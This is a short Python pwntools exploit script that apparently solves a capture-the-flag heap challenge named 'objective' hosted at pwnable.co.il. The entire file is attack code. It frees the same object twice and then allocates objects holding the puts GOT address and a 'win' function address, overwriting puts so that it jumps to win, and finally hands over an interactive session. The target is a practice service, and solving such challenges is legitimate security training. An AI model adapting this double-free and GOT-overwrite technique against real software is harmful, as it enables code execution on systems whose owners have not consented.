from pwn import *

#defines 
PUTS_GOT = 0x0000000000404020
WIN = 0x0000000000401296

def new_obj(p: process, type: int = 3, data: str = "12345"):
    p.sendline("1")
    p.sendline(str(type))
    p.sendline(data)
    p.recvuntil("Exit")

def edit_obj(p: process, index: int = 3, data: str = "12345"):
    p.sendline("2")
    p.sendline(str(index))
    p.sendline(data)
    p.recvuntil("Exit")

def del_obj(p: process, index: int = 0):
    p.sendline("3")
    p.sendline(str(index))
    p.recvuntil("Exit") 

def main():
    ### run ###
    #p = process("./objective")
    p = remote("pwnable.co.il", 9004)

    ### start payload ###
    new_obj(p)
    del_obj(p)
    del_obj(p)
    new_obj(p, data=p64(PUTS_GOT))
    new_obj(p, data=p64(PUTS_GOT))
    new_obj(p, data=p64(WIN))
    p.interactive()

if __name__ == '__main__':
    main()